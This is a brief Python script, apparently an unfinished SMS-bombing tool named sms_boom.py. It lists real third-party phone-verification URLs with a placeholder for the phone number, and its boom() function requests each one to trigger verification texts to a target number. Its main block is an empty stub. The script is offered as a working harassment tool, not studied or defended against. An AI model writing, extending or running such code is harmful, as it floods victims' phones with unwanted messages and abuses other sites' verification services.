#!/usr/bin/env python
# encoding: utf-8

"""
@author: zhanghe
@software: PyCharm
@file: sms_boom.py
@time: 2017/11/24 上午1:33
"""


import requests


get_url_list = [
    'https://www.niugames.cc/Index/Index/checkmessage.html?prefix=86&phone=%s',
    'https://passport.fang.com/loginsendmsm.api?MobilePhone=%s&Service=soufun-passport-web&MathCode=12&Operatetype=2',
]

post_url_list = [
    ''
]

def boom(phone):
    for get_url in get_url_list:
        boom_url = get_url % phone
        res = requests.get(boom_url)
        print res


class Main(object):
    def __init__(self):
        pass


if __name__ == '__main__':
    pass
